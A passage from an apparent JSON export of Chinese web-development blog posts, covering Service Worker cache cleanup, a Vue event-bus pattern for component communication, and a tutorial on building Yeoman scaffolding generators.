\u0009cache.keys().then(\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-params\"\u003ekeyList\u003c/span\u003e =\u0026gt;\u003c/span\u003e {\n      \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003ePromise\u003c/span\u003e.all(keyList.map(\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-params\"\u003ekey\u003c/span\u003e =\u0026gt;\u003c/span\u003e {\n        \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (!cacheWhiteList.includes(key)) {\n          \u003cspan class=\"hljs-comment\"\u003e// 如果不在白名单里面，就删除该缓存\u003c/span\u003e\n          \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e cache.delete(key);\n        }\n      }));\n  \u0009});\n  )\n});\n\u003c/code\u003e\u003c/pre\u003e\u003ch3 class=\"heading\"\u003e调试工具\u003c/h3\u003e\n\u003cp\u003e调试的时候，可以在谷歌浏览器中输入\u003ccode\u003echrome://serviceworker-internals/\u003c/code\u003e查看各个页面SW脚本的工作情况。也可以在开发者工具中查看当前页的SW脚本情况：\n\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/12/31/160a9f211884748b?w=728\u0026amp;h=763\u0026amp;f=jpeg\u0026amp;s=77564\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003eSW目前还是一个草案，在PC端上各个浏览器的支持度并不是很高，但是在手机端已大部分能够实现支持了。作为PWA的一种核心技术，谷歌对SW提供很多很有用的工具，如：\u003ca target=\"_blank\" href=\"https://github.com/GoogleChromeLabs/sw-precache\"\u003eSw-precache\u003c/a\u003e, \u003ca target=\"_blank\" href=\"https://github.com/GoogleChromeLabs/sw-toolbox\"\u003eSw-toolbox\u003c/a\u003e,感兴趣的可以去研究一番。\n下面收集了一些比较有用的工具和参考文章，如果需要深入学习，可以一阅：\n\u003ca target=\"_blank\" href=\"https://github.com/oliviertassinari/serviceworker-webpack-plugin\"\u003eserviceworker-webpack-plugin\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003ehttps://www.npmjs.com/package/workbox-webpack-plugin\u003c/p\u003e\n\u003cp\u003ehttp://air.ghost.io/using-workbox-webpack-to-precache-with-service-worker/\u003c/p\u003e\n\u003cp\u003ehttps://developer.mozilla.org/zh-CN/docs/Web/API/Service_Worker_API\u003c/p\u003e\n\u003cp\u003ehttps://developer.mozilla.org/zh-CN/docs/Web/API/Service_Worker_API/Using_Service_Workers\u003c/p\u003e\n\u003cp\u003ehttps://ivweb.io/topic/5876d4ee441a881744b0d6d6\u003c/p\u003e\n\u003cp\u003ehttps://x5.tencent.com/tbs/guide/serviceworker.html\u003c/p\u003e\n\u003cp\u003ehttps://foio.github.io/\u003c/p\u003e\n\u003cp\u003ehttps://huangxuan.me/2017/07/12/upgrading-eleme-to-pwa/\u003c/p\u003e\n\u003cp\u003e最后，作为2018年的开篇之作，希望各位读者在新的一年里都能工作顺利，生活快乐！\u003c/p\u003e\n","buildTime":"1514894638.5721","__v":0}
{"_id":{"$oid":"5a4b76d92239bd131cd79f38"},"id":"5a4353766fb9a044fb080927","author":{"$oid":"5a4b76d92239bd131cd79f2c"},"imageCache":[{"imageUrlArray":[],"screenShot":null}],"title":"Vue 组件通信之 Bus","meta":{"likeCount":0},"tag":["Vue.js","Vuex"],"comment":[],"shortContent":"关于组件通信我相信小伙伴们肯定也都很熟悉，就不多说了，对组件通信还不熟悉的小伙伴移步这里。 在vue2.0中 $dispatch 和 $broadcast 已经被弃用。官方文档中给出的解释是： 官方推荐的状态管理方案是 Vuex。不过如果项目不是很大，状态管理也没有很复杂的话，…","content":"\u003cp\u003e关于组件通信我相信小伙伴们肯定也都很熟悉，就不多说了，对组件通信还不熟悉的小伙伴移步\u003ca target=\"_blank\" href=\"https://cn.vuejs.org/v2/guide/components.html\"\u003e这里\u003c/a\u003e。\u003cbr\u003e\n在vue2.0中 $dispatch 和 $broadcast 已经被弃用。官方文档中给出的解释是：\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003e因为基于组件树结构的事件流方式实在是让人难以理解，并且在组件结构扩展的过程中会变得越来越脆弱。这种事件方式确实不太好，我们也不希望在以后让开发者们太痛苦。并且$dispatch 和 $broadcast 也没有解决兄弟组件间的通信问题。\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e官方推荐的状态管理方案是 \u003ca target=\"_blank\" href=\"https://github.com/vuejs/vuex\"\u003eVuex\u003c/a\u003e。不过如果项目不是很大，状态管理也没有很复杂的话，使用 \u003cstrong\u003eVuex\u003c/strong\u003e 有种杀鸡用牛刀的感觉，当然，这也是要根据自己的需求来的，只是建议。\u003c/p\u003e\n\u003cp\u003evue官方文档中有这样一个定义：\u003ca target=\"_blank\" href=\"https://cn.vuejs.org/v2/guide/components.html#%E9%9D%9E%E7%88%B6%E5%AD%90%E7%BB%84%E4%BB%B6%E7%9A%84%E9%80%9A%E4%BF%A1\"\u003e非父子组件的通信\u003c/a\u003e，内容很少，如下：\u003cbr\u003e\n\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"image\" src=\"https://user-gold-cdn.xitu.io/2017/12/27/16096fe025e1371b?w=700\u0026amp;h=363\u0026amp;f=png\u0026amp;s=47717\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e其实关于这个\u003cstrong\u003e非父子组件通信\u003c/strong\u003e的demo还是有的，它藏在了\u003ca target=\"_blank\" href=\"https://cn.vuejs.org/v2/guide/migration.html#dispatch-%E5%92%8C-broadcast-%E6%9B%BF%E6%8D%A2\"\u003e$dispatch 和 $broadcast的迁移文档中\u003c/a\u003e，有兴趣的小伙伴可以点击进去查看。文档中的建议就是：\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003e\u003cstrong\u003e对于$dispatch 和 $broadcast最简单的升级方式就是：通过使用事件中心，允许组件自由交流，无论组件处于组件树的哪一层。由于 Vue 实例实现了一个事件分发接口，你可以通过实例化一个空的 Vue 实例来实现这个目的。\u003c/strong\u003e\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e这个\u003cstrong\u003e集中式的事件中间件\u003c/strong\u003e就是 \u003cstrong\u003eBus\u003c/strong\u003e。我习惯将bus定义到全局：\u003c/p\u003e\n\u003cp\u003eapp.js\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003evar eventBus = {\n    install(Vue,options) {\n        Vue.prototype.\u003cspan class=\"hljs-variable\"\u003e$bus\u003c/span\u003e = vue\n    }\n};\nVue.use(eventBus);\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e然后在组件中，可以使用$emit， $on， $off 分别来分发、监听、取消监听事件：\u003c/p\u003e\n\u003cp\u003e分发事件的组件\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e// ...\nmethods: {\n  todo: \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003efunction\u003c/span\u003e\u003c/span\u003e () {\n    this.\u003cspan class=\"hljs-variable\"\u003e$bus\u003c/span\u003e.\u003cspan class=\"hljs-variable\"\u003e$emit\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e'todoSth'\u003c/span\u003e, params);  //params是传递的参数\n    //...\n  }\n}\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e监听的组件\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e// ...\n\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003ecreated\u003c/span\u003e\u003c/span\u003e() {\n  this.\u003cspan class=\"hljs-variable\"\u003e$bus\u003c/span\u003e.\u003cspan class=\"hljs-variable\"\u003e$on\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e'todoSth'\u003c/span\u003e, (params) =\u0026gt; {  //获取传递的参数并进行操作\n      //todo something\n  })\n},\n// 最好在组件销毁前\n// 清除事件监听\n\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003ebeforeDestroy\u003c/span\u003e\u003c/span\u003e () {\n  this.\u003cspan class=\"hljs-variable\"\u003e$bus\u003c/span\u003e.\u003cspan class=\"hljs-variable\"\u003e$off\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e'todoSth'\u003c/span\u003e);\n},\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e如果需要监听多个组件，只需要更改 \u003cstrong\u003ebus\u003c/strong\u003e 的 \u003cstrong\u003eeventName\u003c/strong\u003e:\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e// ...\n\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003ecreated\u003c/span\u003e\u003c/span\u003e() {\n  this.\u003cspan class=\"hljs-variable\"\u003e$bus\u003c/span\u003e.\u003cspan class=\"hljs-variable\"\u003e$on\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e'firstTodo'\u003c/span\u003e, this.firstTodo);\n  this.\u003cspan class=\"hljs-variable\"\u003e$bus\u003c/span\u003e.\u003cspan class=\"hljs-variable\"\u003e$on\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e'secondTodo'\u003c/span\u003e, this.secondTodo);\n},\n// 清除事件监听\n\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003ebeforeDestroy\u003c/span\u003e\u003c/span\u003e () {\n  this.\u003cspan class=\"hljs-variable\"\u003e$bus\u003c/span\u003e.\u003cspan class=\"hljs-variable\"\u003e$off\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e'firstTodo'\u003c/span\u003e, this.firstTodo);\n  this.\u003cspan class=\"hljs-variable\"\u003e$bus\u003c/span\u003e.\u003cspan class=\"hljs-variable\"\u003e$off\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e'secondTodo'\u003c/span\u003e, this.secondTodo);\n},\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e如果文章有错误或是有什么疑问，欢迎在评论中交流。\u003c/p\u003e\n","buildTime":"1514888427.4572","__v":0}
{"_id":{"$oid":"5a4b76a1b11e1a170cb138e8"},"id":"5a488bd2f265da431c70a625","author":{"$oid":"5a4b76a1b11e1a170cb138d7"},"imageCache":[{"imageUrlArray":[],"screenShot":null}],"title":"如何开发自己的 yeoman 脚手架","meta":{"likeCount":0},"tag":["Vue.js","Yeoman"],"comment":[],"shortContent":"脚手架能够帮我们自动生成包含本地调试、编译、打包、发布等工具的项目目录，使我们能够减少大量重复劳动的同时，遵循一定的开发规范，大大提升我们的开发、协同效率。 下文中出现的 generator 统一代指 yeoman 脚手架生成器。 yeoman 脚手架生成器（generator…","content":"\u003cp\u003e脚手架能够帮我们自动生成包含本地调试、编译、打包、发布等工具的项目目录，使我们能够减少大量重复劳动的同时，遵循一定的开发规范，大大提升我们的开发、协同效率。\u003c/p\u003e\n\u003cp\u003e脚手架所做的事情主要有：\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e生成规范化目录结构\u003c/li\u003e\n\u003cli\u003e根据用户输入配置项目信息，如项目名称、开发人员等\u003c/li\u003e\n\u003cli\u003e生成项目本地server、编译、单元测试、打包、发布等配置\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 class=\"heading\"\u003e开发自己的脚手架\u003c/h3\u003e\n\u003cp\u003e下文中出现的 generator 统一代指 yeoman 脚手架生成器。\u003c/p\u003e\n\u003ch4 class=\"heading\"\u003e创建一个 node 模块项目\u003c/h4\u003e\n\u003cp\u003eyeoman 脚手架生成器（generator） 本质上是一个 node 模块。创建一个 yeoman 脚手架生成器，首先我们要先创建一个文件夹，文件夹名称必须为 generator-name （name 为我们自定义脚手架生成器的名称）。这点非常重要，因为 yeoman 通过文件系统去找可用的脚手架生成器。\u003c/p\u003e\n\u003cp\u003e在刚刚创建的文件夹内，创建一个 package.json文件，手动输入如下内容，也可以通过在命令行运行 npm init 生成该文件。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e{\n  \u003cspan class=\"hljs-string\"\u003e\"name\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"generator-name\"\u003c/span\u003e,\n  \u003cspan class=\"hljs-string\"\u003e\"version\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"0.1.0\"\u003c/span\u003e,\n  \u003cspan class=\"hljs-string\"\u003e\"description\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"\"\u003c/span\u003e,\n  \u003cspan class=\"hljs-string\"\u003e\"files\"\u003c/span\u003e: [\n    \u003cspan class=\"hljs-string\"\u003e\"generators\"\u003c/span\u003e\n  ],\n  \u003cspan class=\"hljs-string\"\u003e\"keywords\"\u003c/span\u003e: [\u003cspan class=\"hljs-string\"\u003e\"yeoman-generator\"\u003c/span\u003e],\n  \u003cspan class=\"hljs-string\"\u003e\"dependencies\"\u003c/span\u003e: {\n    \u003cspan class=\"hljs-string\"\u003e\"yeoman-generator\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"^1.0.0\"\u003c/span\u003e\n  }\n}\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003ename 属性必须带有前缀 generator- ；keywords 属性必须含有 \"yeoman-generator\" , 说明字段最好有对该脚手架生成器的简约清晰的说明。此外，务必引入最新版 yeoman-generator 作为项目依赖，可以通过在命令行中运行 npm install --save yeoman-generator 来安装此依赖。\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e目录结构\u003c/h3\u003e\n\u003cp\u003eyeoman 会根据脚手架生成器目录结构来完成相应操作，每个子脚手架生成器必须包含在自己的文件夹内。\u003c/p\u003e\n\u003cp\u003e当在命令行运行 yo name 命令时，yeoman 会默认生成 app 文件夹内的脚手生成器架内容。\u003c/p\u003e\n\u003cp\u003e子脚手架生成器可以通过在命令行中运行 yo name:subcommand 来执行。\u003c/p\u003e\n\u003cp\u003e项目目录示例如下：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e|---- package.json\n|---- generators/\n    |---- app/\n        |---- index.js\n    |---- router/\n        |---- index.js\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003eyeoman 支持两种不同的目录结构，即 ./ 和 ./generators 两种形式。\u003c/p\u003e\n\u003cp\u003e上述示例也可以这么写:\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e|---- package.json\n|---- app/\n    |---- index.js\n|---- router/\n    |---- index.js\n\u003c/code\u003e\u003c/pre\u003e\u003ch3 class=\"heading\"\u003e下一步\u003c/h3\u003e\n\u003cp\u003e目录结构就位，就可以完整的脚手架生成器了。\u003c/p\u003e\n\u003cp\u003eyeoman 提供了一个 base generator 基础类 ，通过继承 base generator 可大幅减少我们生成一个脚手架生成器的工作量。\u003c/p\u003e\n\u003cp\u003e可以在 index.js 文件中，集成该基础类：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003evar Generator = require(\u003cspan class=\"hljs-string\"\u003e'yeoman-generator'\u003c/span\u003e);\n\nmodule.exports = class extends Generator {};\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e如果想支持 ES5 环境，静态方法 Generator.extend() 可以用来拓展基类，并且允许你提供一个新的 prototype。该方法参照 \u003ca target=\"_blank\" href=\"https://github.com/SBoudrias/class-extend\"\u003eclass-extend\u003c/a\u003e。\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e重写构造函数\u003c/h3\u003e\n\u003cp\u003e有些生成器函数只能在构造函数 constructor 内部调用，这些特殊的方法可能用于重要状态的控制或者不对构造函数外部造成影响。\u003c/p\u003e\n\u003cp\u003e重写生成器构造函数的方法如下：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003emodule.exports = class extends Generator {\n  // The name `constructor` is important here\n  constructor(args, opts) {\n    // Calling the super constructor is important so our generator is correctly \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003e up\n    super(args, opts);\n\n    // Next, add your custom code\n    this.option(\u003cspan class=\"hljs-string\"\u003e'babel'\u003c/span\u003e); // This method adds support \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e a `--babel` flag\n  }\n};\n\u003c/code\u003e\u003c/pre\u003e\u003ch3 class=\"heading\"\u003e增加自定义功能\u003c/h3\u003e\n\u003cp\u003e增加到 property 上的每个方法都会按照某种顺序执行，但是某些特定的方法也会有特殊的触发逻辑。\u003c/p\u003e\n\u003cp\u003e如下，增加几个方法：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003emodule.exports = class extends Generator {\n  \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003emethod1\u003c/span\u003e\u003c/span\u003e() {\n    this.log(\u003cspan class=\"hljs-string\"\u003e'method 1 just ran'\u003c/span\u003e);\n  }\n\n  \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003emethod2\u003c/span\u003e\u003c/span\u003e() {\n    this.log(\u003cspan class=\"hljs-string\"\u003e'method 2 just ran'\u003c/span\u003e);\n  }\n};\n\u003c/code\u003e\u003c/pre\u003e\u003ch3 class=\"heading\"\u003e运行脚手架\u003c/h3\u003e\n\u003cp\u003e到这里，我们的脚手架就处于可运行状态了。刚才我们本地开发了 一个脚手架，但是它还不能全局运行。我们应该使用 npm 创建一个node全局模块，并且连接到本地。\u003c/p\u003e\n\u003cp\u003e在脚手架项目根目录下（generator-name/），输入如下\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003enpm link\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e这样会安装依赖，并且连接全局模块到本地文件。然后，可通过在命令行中输入 yo name ，即可运行该脚手架生成器。\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003e脚手架运行时环境\u003c/h2\u003e\n\u003cp\u003e脚手架生成器方法是如何运行的、运行环境是怎样的是对于开发脚手架最重要的概念之一。\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e方法即行为\u003c/h3\u003e\n\u003cp\u003e每一个绑定在脚手架生成器 prototype 上的方法都可以被当做一个任务。每个任务都是按顺序在 yeoman 运行环境中运行的。\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e助手和私有方法\u003c/h3\u003e\n\u003cp\u003e既然每个 prototype 方法都被当做一个任务，你可能会疑惑如何去定义一个不会被自动调用的助手或私有方法。以下有3种方式达到该目的：\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e为方法名添加下划线前缀\u003c/li\u003e\n\u003c/ol\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e  class extends Generator {\n    \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003emethod1\u003c/span\u003e\u003c/span\u003e() {\n      console.log(\u003cspan class=\"hljs-string\"\u003e'hey 1'\u003c/span\u003e);\n    }\n\n    \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003e_private_method\u003c/span\u003e\u003c/span\u003e() {\n      console.log(\u003cspan class=\"hljs-string\"\u003e'private hey'\u003c/span\u003e);\n    }\n  }\n\u003c/code\u003e\u003c/pre\u003e\u003col start=\"2\"\u003e\n\u003cli\u003e使用实例方法\u003c/li\u003e\n\u003c/ol\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e  class extends Generator {\n    constructor(args, opts) {\n      // Calling the super constructor is important so our generator is correctly \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003e up\n      super(args, opts)\n\n      this.helperMethod = \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003efunction\u003c/span\u003e\u003c/span\u003e () {\n        console.log(\u003cspan class=\"hljs-string\"\u003e'won\\'\u003c/span\u003et be called automatically\u003cspan class=\"hljs-string\"\u003e');\n      };\n    }\n  }\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003col start=\"3\"\u003e\n\u003cli\u003e继承一个父生成器 （parent generator）\u003c/li\u003e\n\u003c/ol\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e  class MyBase extends Generator {\n    \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003ehelper\u003c/span\u003e\u003c/span\u003e() {\n      console.log(\u003cspan class=\"hljs-string\"\u003e'methods on the parent generator won\\'\u003c/span\u003et be called automatically\u003cspan class=\"hljs-string\"\u003e');\n    }\n  }\n\n  module.exports = class extends MyBase {\n    exec() {\n      this.helper();\n    }\n  };\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003ch3 class=\"heading\"\u003e生成器生命周期\u003c/h3\u003e\n\u003cp\u003e按顺序运行任务对于单生成器来说已经够了，但是当你把多个生成器合在一起时就有问题了。这就是 yeoman 使用生命周期的原因。\u003c/p\u003e\n\u003cp\u003e生命周期是一个带有优先权的队列系统。\u003c/p\u003e\n\u003cp\u003e生命周期执行顺序如下：\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003einitializing - 初始化函数\u003c/li\u003e\n\u003cli\u003eprompting - 接收用户输入阶段\u003c/li\u003e\n\u003cli\u003econfiguring - 保存配置信息和文件\u003c/li\u003e\n\u003cli\u003edefault - 自定义功能函数名称，如 method1\u003c/li\u003e\n\u003cli\u003ewriting - 生成项目目录结构阶段\u003c/li\u003e\n\u003cli\u003econflicts - 统一处理冲突，如要生成的文件已经存在是否覆盖等处理\u003c/li\u003e\n\u003cli\u003einstall - 安装依赖阶段\u003c/li\u003e\n\u003cli\u003eend - 生成器结束阶段\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch3 class=\"heading\"\u003e异步任务\u003c/h3\u003e\n\u003cp\u003e有几种暂停生命周期知道一个异步任务结束的方法。\u003c/p\u003e\n\u003cp\u003e最简单的方式就是 return 一个 promise。\u003c/p\u003e\n\u003cp\u003e如果你依赖的异步 API 不支持 promise，我们可以使用 this.async() 方法。调用 this.async() 方法会在任务结束时返回一个函数。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003easyncTask\u003c/span\u003e\u003c/span\u003e() {\n  var \u003cspan class=\"hljs-keyword\"\u003edone\u003c/span\u003e = this.async();\n\n  getUserEmail(\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e (err, name) {\n    \u003cspan class=\"hljs-keyword\"\u003edone\u003c/span\u003e(err);\n  });\n}\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e如果 done 函数被调用，并且传参为一个 error 参数，那么生命周期会结束，并且异常会抛出。\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003e用户交互\u003c/h2\u003e\n\u003ch3 class=\"heading\"\u003e系统提示\u003c/h3\u003e\n\u003cp\u003e系统提示是脚手架生成器和用户交互的主要方式。系统提示模块使用\u003ca target=\"_blank\" href=\"https://github.com/SBoudrias/Inquirer.js\"\u003eInquirer.js\u003c/a\u003e。\u003c/p\u003e\n\u003cp\u003e系统提示命令时异步的，会返回一个 promise。你需要在你的任务中返回一个 promise ，来达到执行完当前任务，再执行下一个任务的目的。\u003c/p\u003e\n\u003cp\u003e示例如下：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003emodule.exports = class extends Generator {\n  \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003eprompting\u003c/span\u003e\u003c/span\u003e() {\n    \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e this.prompt([{\n      \u003cspan class=\"hljs-built_in\"\u003etype\u003c/span\u003e    : \u003cspan class=\"hljs-string\"\u003e'input'\u003c/span\u003e,\n      name    : \u003cspan class=\"hljs-string\"\u003e'name'\u003c/span\u003e,\n      message : \u003cspan class=\"hljs-string\"\u003e'Your project name'\u003c/span\u003e,\n      default : this.appname // Default to current folder name\n    }, {\n      \u003cspan class=\"hljs-built_in\"\u003etype\u003c/span\u003e    : \u003cspan class=\"hljs-string\"\u003e'confirm'\u003c/span\u003e,\n      name    : \u003cspan class=\"hljs-string\"\u003e'cool'\u003c/span\u003e,\n      message : \u003cspan class=\"hljs-string\"\u003e'Would you like to enable the Cool feature?'\u003c/span\u003e\n    }]).then((answers) =\u0026gt; {\n      this.log(\u003cspan class=\"hljs-string\"\u003e'app name'\u003c/span\u003e, answers.name);\n      this.log(\u003cspan class=\"hljs-string\"\u003e'cool feature'\u003c/span\u003e, answers.cool);\n    });\n  }\n};\n\u003c/code\u003e\u003c/pre\u003e\u003ch3 class=\"heading\"\u003e记录用户参数\u003c/h3\u003e\n\u003cp\u003e对于特定问题，用户往往会给出相同的答案，对于这些问题，最好记住用户的历史输入。\u003c/p\u003e\n\u003cp\u003eyeoman 拓展了 Inquirer.js，新增 store 属性，用于允许记录用户历史输入。示例如下：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003ethis.prompt({\n  \u003cspan class=\"hljs-built_in\"\u003etype\u003c/span\u003e    : \u003cspan class=\"hljs-string\"\u003e'input'\u003c/span\u003e,\n  name    : \u003cspan class=\"hljs-string\"\u003e'username'\u003c/span\u003e,\n  message : \u003cspan class=\"hljs-string\"\u003e'What\\'\u003c/span\u003es your GitHub username\u003cspan class=\"hljs-string\"\u003e',\n  store   : true\n});\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003ch3 class=\"heading\"\u003e参数 arguments\u003c/h3\u003e\n\u003cp\u003e参数直接从命令行中获取，如：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003eyo webapp my-project\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e上述例子中，my-project 就是一个参数。\u003c/p\u003e\n\u003cp\u003e定义参数的方法如下：\u003c/p\u003e\n\u003cp\u003e使用 this.argument(name, options) 方法，其中 options 是一个多键值对对象：\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003edesc String - 参数说明\u003c/li\u003e\n\u003cli\u003erequired Boolean - 是否必填\u003c/li\u003e\n\u003cli\u003etype String, Number, Array (也可以是返回字符串的自定义函数) - 类型\u003c/li\u003e\n\u003cli\u003edefault - 默认值\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003ethis.argument(name, options) 只能在构造函数内调用。另外 help 参数不可用于传入值，如 yo webapp --help。\u003c/p\u003e\n\u003cp\u003e使用示例如下：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003emodule.exports = class extends Generator {\n  // note: arguments and options should be defined \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e the constructor.\n  constructor(args, opts) {\n    super(args, opts);\n\n    // This makes `appname` a required argument.\n    this.argument(\u003cspan class=\"hljs-string\"\u003e'appname'\u003c/span\u003e, { \u003cspan class=\"hljs-built_in\"\u003etype\u003c/span\u003e: String, required: \u003cspan class=\"hljs-literal\"\u003etrue\u003c/span\u003e });\n\n    // And you can \u003cspan class=\"hljs-keyword\"\u003ethen\u003c/span\u003e access it later; e.g.\n    this.log(this.options.appname);\n  }\n};\n\u003c/code\u003e\u003c/pre\u003e\u003ch3 class=\"heading\"\u003e选项 options\u003c/h3\u003e\n\u003cp\u003e选项和参数非常相似。通过 generator.option(name, options) 调用。options 为一个多键值对对象，属性如下：\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003edesc -  选项说明\u003c/li\u003e\n\u003cli\u003ealias - 别名\u003c/li\u003e\n\u003cli\u003etype Either Boolean, String or Number (也可以是返回纯字符串的函数) - 类型\u003c/li\u003e\n\u003cli\u003edefault - 默认值\u003c/li\u003e\n\u003cli\u003ehide Boolean - 是否从 help 中隐藏\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e使用示例：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003emodule.exports = class extends Generator {\n  // note: arguments and options should be defined \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e the constructor.\n  constructor(args, opts) {\n    super(args, opts);\n\n    // This method adds support \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e a `--coffee` flag\n    this.option(\u003cspan class=\"hljs-string\"\u003e'coffee'\u003c/span\u003e);\n\n    // And you can \u003cspan class=\"hljs-keyword\"\u003ethen\u003c/span\u003e access it later; e.g.\n    this.scriptSuffix = (this.options.coffee ? \u003cspan class=\"hljs-string\"\u003e\".coffee\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\".js\"\u003c/span\u003e);\n  }\n};\n\u003c/code\u003e\u003c/pre\u003e\u003ch3 class=\"heading\"\u003e输出信息\u003c/h3\u003e\n\u003cp\u003e通过 generator.log 模块输出信息。使用示例：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003emodule.exports = class extends Generator {\n  \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003emyAction\u003c/span\u003e\u003c/span\u003e() {\n    this.log(\u003cspan class=\"hljs-string\"\u003e'Something has gone wrong!'\u003c/span\u003e);\n  }\n};\n\u003c/code\u003e\u003c/pre\u003e\u003ch2 